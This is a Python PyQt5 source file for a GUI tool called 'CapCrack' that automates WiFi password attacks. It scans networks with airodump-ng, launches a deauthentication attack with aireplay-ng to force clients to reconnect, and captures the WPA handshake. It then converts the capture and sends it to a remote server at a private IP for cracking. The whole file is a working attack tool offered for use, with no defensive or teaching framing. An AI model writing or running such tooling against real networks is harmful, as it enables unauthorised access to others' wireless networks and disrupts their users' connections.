import sys
import subprocess
import requests
import csv
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton,
    QTableWidget, QTableWidgetItem, QInputDialog, QMessageBox,
    QHeaderView, QProgressDialog
)
from PyQt5.QtCore import QThread, pyqtSignal
import os
import time

class APICallThread(QThread):
    success = pyqtSignal(str)
    error = pyqtSignal(str)

    def __init__(self, handshake_data, mask):
        super().__init__()
        self.handshake_data = handshake_data
        self.mask = mask

    def run(self):
        try:
            response = requests.post(
                'http://172.31.124.39:5000/crack_wifi',
                data={'handshake': self.handshake_data, 'mask': self.mask}
            )
            cracked_password = response.json().get('cracked_password')
            self.success.emit(cracked_password)
        except Exception as e:
            self.error.emit(str(e))

class RefreshNetworksThread(QThread):
    finished = pyqtSignal(list)
    error = pyqtSignal(str)

    def run(self):
        try:
            csv_file = 'output_files/networks-01.csv'
            if os.path.exists(csv_file):
                os.remove(csv_file)

            # Start airodump-ng process
            process = subprocess.Popen(
                ['airodump-ng', 'wlan0mon', '-w', 'output_files/networks', '--output-format', 'csv'],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True
            )
            # Allow it to run for 3 seconds
            time.sleep(3)
            # Terminate the process after 3 seconds
            process.terminate()

            # Wait for the CSV file to be generated
            time.sleep(3)
            if not os.path.exists(csv_file):
                self.error.emit('CSV file not generated.')
                return

            with open(csv_file, 'r') as f:
                reader = csv.reader(f)
                networks = []
                for row in reader:
                    # Skip empty lines or lines without enough data
                    if len(row) < 14 or row[0] == 'BSSID' or not row[0].strip():
                        continue
                    try:
                        bssid = row[0].strip()
                        channel = row[3].strip()
                        ssid = row[13].strip() if row[13].strip() else "<Hidden SSID>"
                        networks.append((ssid, bssid, channel))
                    except IndexError as e:
                        # Log parsing error for debugging
                        print(f"Error parsing row: {row} - {e}")
            self.finished.emit(networks)
        except Exception as e:
            self.error.emit(str(e))

class WiFiCrackerApp(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        # Ensure output_files directory is cleared
        output_dir = 'output_files'
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        for file in os.listdir(output_dir):
            file_path = os.path.join(output_dir, file)
            if os.path.isfile(file_path):
                os.remove(file_path)
        # Set up the window
        self.setWindowTitle('CapCrack')
        self.setGeometry(0, 0, 800, 600)
        self.move(QApplication.desktop().screen().rect().center() - self.rect().center())

        # Create layout
        main_layout = QVBoxLayout()
        list_layout = QHBoxLayout()

        # WiFi networks table
        self.networks_table = QTableWidget()
        self.networks_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.networks_table.setColumnCount(3)
        self.networks_table.setHorizontalHeaderLabels(['SSID', 'BSSID', 'Channel'])
        self.networks_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.networks_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self.networks_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeToContents)
        list_layout.addWidget(self.networks_table)

        # Add buttons
        self.monitor_button = QPushButton('Monitor for Handshake')
        self.monitor_button.clicked.connect(self.monitor_handshake)

        self.deauth_button = QPushButton('Run Deauth Attack')
        self.deauth_button.clicked.connect(self.run_deauth)

        self.refresh_button = QPushButton('Refresh Networks')
        self.refresh_button.clicked.connect(self.refresh_networks)

        # Add widgets to layout
        main_layout.addLayout(list_layout)
        main_layout.addWidget(self.monitor_button)
        main_layout.addWidget(self.deauth_button)
        main_layout.addWidget(self.refresh_button)

        self.setLayout(main_layout)

    def refresh_networks(self):
        progress = QProgressDialog('Refreshing Networks...', None, 0, 0, self)
        progress.setWindowTitle('Scanning for WiFi Networks')
        progress.setCancelButton(None)
        progress.setMinimumDuration(0)
        progress.setValue(0)
        progress.setMaximum(0)
        progress.show()
        QApplication.processEvents()

        self.refresh_thread = RefreshNetworksThread()
        self.refresh_thread.finished.connect(self.on_refresh_finished)
        self.refresh_thread.error.connect(self.on_refresh_error)
        self.refresh_thread.finished.connect(progress.close)
        self.refresh_thread.start()

    def on_refresh_finished(self, networks):
        self.networks_table.setRowCount(0)
        for ssid, bssid, channel in networks:
            row_position = self.networks_table.rowCount()
            self.networks_table.insertRow(row_position)
            self.networks_table.setItem(row_position, 0, QTableWidgetItem(ssid))
            self.networks_table.setItem(row_position, 1, QTableWidgetItem(bssid))
            self.networks_table.setItem(row_position, 2, QTableWidgetItem(channel))

    def on_refresh_error(self, error_message):
        QMessageBox.critical(self, 'Error', f'Failed to refresh networks: {error_message}')

    def monitor_handshake(self):
        # Create a loading bar for handshake monitoring
        progress = QProgressDialog('Monitoring for WPA handshake...', None, 0, 0, self)
        progress.setWindowTitle('Waiting for Handshake')
        progress.setCancelButton(None)
        progress.setMinimumDuration(0)
        progress.setValue(0)
        progress.show()
        QApplication.processEvents()

        # Monitor the selected network for handshake
        selected_row = self.networks_table.currentRow()
        if selected_row == -1:
            QMessageBox.warning(self, 'Warning', 'Please select a WiFi network to monitor.')
            progress.close()
            return

        ssid = self.networks_table.item(selected_row, 0).text()
        bssid = self.networks_table.item(selected_row, 1).text()
        channel = self.networks_table.item(selected_row, 2).text()
        try:
            # Run airodump-ng to capture handshake
            process = subprocess.Popen(
                ['airodump-ng', '--bssid', bssid, '--channel', channel, '-w', 'output_files/capture', 'wlan0mon'],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True
            )

            # Monitor the stdout for WPA handshake
            while True:
                output = process.stdout.readline()
                print(output, end='')
                progress.setValue(progress.value() + 1)
                QApplication.processEvents()
                if 'WPA handshake' in output:
                    progress.close()
                    print('Handshake captured!')
                    process.terminate()
                    time.sleep(2)
                    break

            # Convert the captured handshake using hcxpcapng
            subprocess.run(
                ['hcxpcapngtool', '-o', 'output_files/handshake.hccapx', 'output_files/capture-01.cap'],
                check=True
            )

            # Prompt for mask
            mask, ok = QInputDialog.getText(self, 'Handshake Captured!', 'Enter mask:')
            if not ok or not mask:
                return

            # Send handshake to API
            with open('output_files/handshake.hccapx', 'rb') as f:
                handshake_data = f.read()

            api_progress = QProgressDialog('Sending handshake to API...', None, 0, 0, self)
            api_progress.setWindowTitle('Waiting for API Response')
            api_progress.setCancelButton(None)
            api_progress.setMinimumDuration(0)
            api_progress.setValue(0)
            api_progress.setMaximum(0)
            api_progress.show()
            QApplication.processEvents()

            # Run API request in a separate thread
            self.api_thread = APICallThread(handshake_data, mask)
            self.api_thread.success.connect(self.api_call_success)
            self.api_thread.error.connect(self.api_call_error)
            self.api_thread.finished.connect(api_progress.close)
            self.api_thread.start()
        except Exception as e:
            progress.close()
            QMessageBox.critical(self, 'Error', f'Failed to capture handshake: {e}')

    def api_call_success(self, cracked_password):
        QMessageBox.information(self, 'Cracked Password', f'Cracked Password: {cracked_password}')

    def api_call_error(self, error_message):
        QMessageBox.critical(self, 'Error', f'Failed to send handshake to API: {error_message}')

    def run_deauth(self):
        progress = QProgressDialog('Running Deauth Attack...', None, 0, 0, self)
        progress.setWindowTitle('Deauth Attack in Progress')
        progress.setCancelButton(None)
        progress.setMinimumDuration(0)
        progress.setValue(0)
        progress.show()
        QApplication.processEvents()

        selected_row = self.networks_table.currentRow()
        if selected_row == -1:
            QMessageBox.warning(self, 'Warning', 'Please select a WiFi network to deauthenticate.')
            progress.close()
            return

        ssid = self.networks_table.item(selected_row, 0).text()
        bssid = self.networks_table.item(selected_row, 1).text()
        channel = self.networks_table.item(selected_row, 2).text()
        try:
            # Run deauth attack and monitoring simultaneously
            deauth_process = subprocess.Popen(
                ['aireplay-ng', '--deauth', '10', '-a', bssid, 'wlan0mon'],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True
            )
            monitor_process = subprocess.Popen(
                ['airodump-ng', '--bssid', bssid, '--channel', channel, '-w', 'output_files/capture', 'wlan0mon'],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True
            )

            # Monitor the output for WPA handshake
            while True:
                output = monitor_process.stdout.readline()
                print(output, end='')
                progress.setValue(progress.value() + 1)
                QApplication.processEvents()
                if 'WPA handshake' in output:
                    progress.close()
                    print('Handshake captured!')
                    break

            # Convert the captured handshake using hcxpcapng
            subprocess.run(
                ['hcxpcapngtool', '-o', 'output_files/handshake.hccapx', 'output_files/capture-01.cap'],
                check=True
            )
            time.sleep(3)
            # Prompt for mask
            mask, ok = QInputDialog.getText(self, 'Handshake Captured!', 'Enter mask:')
            if not ok or not mask:
                return

            # Send handshake to API
            with open('output_files/handshake.hccapx', 'rb') as f:
                handshake_data = f.read()

            api_progress = QProgressDialog('Sending handshake to API...', None, 0, 0, self)
            api_progress.setWindowTitle('Waiting for API Response')
            api_progress.setCancelButton(None)
            api_progress.setMinimumDuration(0)
            api_progress.setValue(0)
            api_progress.setMaximum(0)
            api_progress.show()
            QApplication.processEvents()

            # Run API request in a separate thread
            self.api_thread = APICallThread(handshake_data, mask)
            self.api_thread.success.connect(self.api_call_success)
            self.api_thread.error.connect(self.api_call_error)
            self.api_thread.finished.connect(api_progress.close)
            self.api_thread.start()

            # Terminate processes after workflow is complete
            monitor_process.terminate()
            deauth_process.terminate()
        except Exception as e:
            progress.close()
            QMessageBox.critical(self, 'Error', f'Failed to run deauth attack: {e}')

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = WiFiCrackerApp()
    ex.show()
    sys.exit(app.exec_())